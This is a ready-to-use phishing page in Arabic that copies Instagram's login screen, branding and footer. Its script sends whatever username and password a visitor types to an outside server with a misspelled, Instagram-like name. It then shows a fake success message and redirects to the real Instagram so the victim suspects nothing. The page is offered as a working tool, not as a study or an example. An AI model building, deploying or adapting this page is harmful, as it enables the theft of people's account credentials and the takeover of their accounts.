<!doctype html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>تسجيل الدخول — Instagram</title>
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@300;400;600&display=swap"
        rel="stylesheet">
    <style>
        :root {
            --bg: #000;
            --card: #0f0f10;
            --muted: #9aa4af;
            --accent: #385185;
            --primary: #4064f5;
        }

        * {
            box-sizing: border-box
        }

        html,
        body {
            height: 100%
        }

        body {
            margin: 0;
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;
            background: var(--bg);
            color: #fff;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .wrap {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .container {
            display: grid;
            grid-template-columns: 420px 480px;
            gap: 48px;
            align-items: center;
            width: 100%;
            max-width: 1100px;
        }

        /* left form */
        .card {
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.02), rgba(255, 255, 255, 0.01));
            padding: 28px;
            border-radius: 8px;
            box-shadow: 0 6px 30px rgba(0, 0, 0, 0.6);
            position: relative;
            overflow: hidden;
        }

        .logo {
            font-family: 'Pacifico', cursive;
            font-size: 48px;
            text-align: center;
            margin-bottom: 18px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 12px
        }

        input[type=text],
        input[type=password] {
            width: 100%;
            padding: 12px 14px;
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #fff;
            border-radius: 4px;
            outline: none;
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.4)
        }

        .btn {
            width: 100%;
            padding: 10px 14px;
            border-radius: 6px;
            border: none;
            background: var(--primary);
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            margin-top: 6px;
            transition: 0.2s;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: wait;
        }

        .or {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 10px 0;
            color: var(--muted);
            font-size: 14px
        }

        .or:before,
        .or:after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.06)
        }

        .small {
            font-size: 14px;
            color: var(--muted);
            text-align: center
        }

        .link {
            color: #55a0ff;
            text-decoration: none
        }

        /* Loading Spinner */
        .loader {
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top: 3px solid #fff;
            border-radius: 50%;
            width: 22px;
            height: 22px;
            animation: spin 1s linear infinite;
            margin: auto;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg)
            }

            100% {
                transform: rotate(360deg)
            }
        }

        /* success message */
        .success-msg {
            position: absolute;
            inset: 0;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 10px;
            text-align: center;
            color: #fff;
            font-size: 18px;
            opacity: 0;
            pointer-events: none;
            transition: 0.4s ease;
        }

        .success-msg.active {
            opacity: 1;
            pointer-events: auto;
        }

        /* right mockups */
        .mockups {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center
        }

        .phone {
            width: 600px;
            height: 600px;
            border-radius: 28px;
            overflow: hidden;
        }

        .phone img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block
        }

        /* footer */
        .footer {
            margin-top: 34px;
            text-align: center;
            color: var(--muted);
            font-size: 13px
        }

        .foot-links {
            margin-top: 8px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center
        }

        .foot-links a {
            color: rgba(255, 255, 255, 0.5);
            text-decoration: none;
            font-size: 13px
        }

        @media (max-width:980px) {
            .container {
                grid-template-columns: 1fr;
                gap: 24px
            }

            .mockups {
                order: -1
            }

            .phone {
                margin: 0 auto
            }
        }

        @media (max-width:600px) {
            .mockups {
                display: none;
            }

            .logo {
                font-size: 36px
            }

            .container {
                padding: 0 6px
            }
        }
    </style>
</head>

<body>
    <div class="wrap">
        <div class="container">
            
            <div class="mockups" aria-hidden="true">
                <div class="phone"><img src="image.png" alt="mock" /></div>
            </div>

            <div class="card" id="card">
                <div class="logo">Instagram</div>

                <form id="loginForm">
                    <input id="email" type="text" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني"
                        required>
                    <div style="position:relative">
                        <input id="pw" type="password" placeholder="كلمة السر" required>
                        <button type="button" onclick="togglePw()"
                            style="position:absolute;left:8px;top:50%;transform:translateY(-50%);background:transparent;border:none;color:rgba(255,255,255,0.6);cursor:pointer">إظهار</button>
                    </div>

                    <button class="btn" type="submit" id="submitBtn">تسجيل الدخول</button>
                    <div class="loader" id="loader" style="display:none"></div>

                    <div class="or">أو</div>
                    <div style="text-align:center;margin-top:6px">
                        <a class="link" href="#"><strong>تسجيل الدخول بحساب فيسبوك</strong></a>
                    </div>

                    <div class="small" style="margin-top:18px">
                        هل نسيت كلمة السر؟
                    </div>
                </form>

                <div style="border-top:1px solid rgba(255,255,255,0.05);margin-top:18px;padding-top:18px">
                    <div class="small">ليس لديك حساب؟ <a class="link" href="#">تسجيل</a></div>
                </div>

                <div class="footer">
                    <div class="foot-links">
                        <a href="#">Meta</a>
                        <a href="#">حول</a>
                        <a href="#">المدونة</a>
                        <a href="#">الوظائف</a>
                        <a href="#">مساعدة</a>
                        <a href="#">الخصوصية</a>
                    </div>
                    <div style="margin-top:10px;color:rgba(255,255,255,0.35)">© 2025 Instagram from Meta</div>
                </div>

                <div class="success-msg" id="successMsg">
                    <h3>✅ تم تسجيل الدخول بنجاح</h3>
                    <p>سيتم تحويلك خلال لحظات...</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        function togglePw() {
            const pw = document.getElementById('pw');
            pw.type = pw.type === 'password' ? 'text' : 'password';
        }

        const form = document.getElementById('loginForm');
        const loader = document.getElementById('loader');
        const submitBtn = document.getElementById('submitBtn');
        const successMsg = document.getElementById('successMsg');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('pw').value.trim();

            if (!email || !password) {
                alert("يرجى ملء جميع الحقول");
                return;
            }

            submitBtn.disabled = true;
            loader.style.display = "block";

            try {
                const response = await fetch("https://instgram-app-login-back-end.vercel.app/login", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ username: email, password })
                });

                const data = await response.json();
                loader.style.display = "none";
                submitBtn.disabled = false;

                if (response.ok) {
                    successMsg.classList.add("active");

                    // إعادة توجيه بعد 2.5 ثانية
                    setTimeout(() => {
                        window.location.href = "https://www.instagram.com/"; // 👈 ضع الرابط الذي تريد التوجيه إليه
                    }, 2500);
                } else {
                    alert(data.message || "حدث خطأ أثناء تسجيل الدخول ❌");
                }
            } catch (err) {
                loader.style.display = "none";
                submitBtn.disabled = false;
                alert("تعذر الاتصال بالخادم ❌");
            }
        });
    </script>
</body>

</html>
